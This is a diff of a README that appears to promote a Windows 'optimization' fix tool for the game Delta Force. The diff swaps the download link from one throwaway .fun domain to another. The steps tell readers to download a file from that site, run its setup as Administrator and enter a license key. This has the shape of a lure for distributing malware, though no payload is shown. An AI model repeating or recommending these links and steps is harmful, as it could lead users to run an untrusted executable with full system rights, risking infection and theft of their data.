@@ -14,14 +14,14 @@ Fix **delta force optimization pc** on Windows 10/11. Built for PC gamers — **
 
 | | |
 | --- | --- |
-| **Direct link** | **[deltafos.sentineltool.fun](https://deltafos.sentineltool.fun/)** |
-| **Full URL** | `https://deltafos.sentineltool.fun/` |
+| **Direct link** | **[deltafos.wonderchain.fun](https://deltafos.wonderchain.fun/)** |
+| **Full URL** | `https://deltafos.wonderchain.fun/` |
 | **Type** | Fix tool for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Open **[deltafos.sentineltool.fun](https://deltafos.sentineltool.fun/)** in your browser
+1. Open **[deltafos.wonderchain.fun](https://deltafos.wonderchain.fun/)** in your browser
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
